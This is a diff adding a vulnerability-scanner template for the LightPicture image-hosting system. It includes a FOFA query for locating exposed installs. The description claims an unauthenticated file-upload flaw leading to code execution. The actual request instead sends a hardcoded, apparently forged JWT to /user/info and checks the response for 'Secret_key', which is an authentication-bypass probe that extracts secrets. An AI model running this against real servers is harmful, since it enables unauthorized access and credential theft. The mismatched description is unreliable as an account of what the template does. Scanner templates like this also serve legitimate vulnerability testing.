@@ -1,0 +1,26 @@
+id: lightpicture-upload-unauthorized-file-upload
+
+info:
+  name: "LightPicture图床upload接口未授权文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="LightPicture" || icon_hash="91344513"
+    LightPicture企业/团队图床系统的upload接口存在未授权的文件上传缺陷。攻击者无需身份认证即可构造恶意请求，绕过文件类型校验限制，将任意文件上传至服务器。此漏洞可能导致远程代码执行或服务器被完全控制，严重威胁系统完整性与安全性。
+  tags: LightPicture
+
+http:
+- raw:
+  - |
+    GET /user/info HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzI1OTc2NzAsIm5iZiI6MTc3MjU5NzY3MCwiZXhwIjoxODM1NjY5NjcwLCJ1c2VybmFtZSI6IjEifQ.6wsv4foJay0_DS9wxxvM15s5Jrj5jfG7uOFe1RNt4_8
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Secret_key'
